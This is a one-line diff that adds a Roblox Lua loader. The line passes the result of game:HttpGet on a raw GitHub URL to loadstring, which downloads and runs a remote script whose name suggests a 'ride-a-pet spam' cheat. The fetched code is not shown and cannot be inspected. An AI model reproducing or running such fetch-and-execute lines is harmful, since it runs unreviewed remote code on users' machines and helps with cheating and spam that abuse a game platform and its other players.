@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/ride-a-pet-spam3-dvezzebomdcb26.lua"))()
